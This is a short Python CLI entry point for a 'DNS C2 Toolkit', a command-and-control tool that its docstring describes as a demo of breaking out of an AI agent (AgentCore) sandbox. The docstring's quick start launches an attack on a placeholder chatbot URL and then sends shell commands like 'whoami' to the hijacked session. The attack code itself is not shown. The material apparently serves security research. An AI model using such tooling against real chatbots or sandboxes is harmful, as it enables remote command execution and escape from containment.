"""Main CLI entry point for C2 toolkit."""

import click

from c2.core.config import get_config

from .attack import attack
from .generate import generate_csv
from .session import attach, receive, send, status


@click.group()
@click.version_option(package_name="c2")
@click.pass_context
def cli(ctx):
    """
    DNS C2 Toolkit - Command & Control for AgentCore sandbox breakout demo.

    \b
    Quick start:
      c2 attack https://victim-chatbot.com    Launch attack
      c2 send "whoami" -s sess_xxx            Send command
      c2 receive -s sess_xxx                  Get output
      c2 attach sess_xxx                      Interactive mode
    """
    ctx.ensure_object(dict)
    ctx.obj["config"] = get_config()


# Register commands
cli.add_command(attack)
cli.add_command(send)
cli.add_command(receive)
cli.add_command(attach)
cli.add_command(status)
cli.add_command(generate_csv)


if __name__ == "__main__":
    cli()
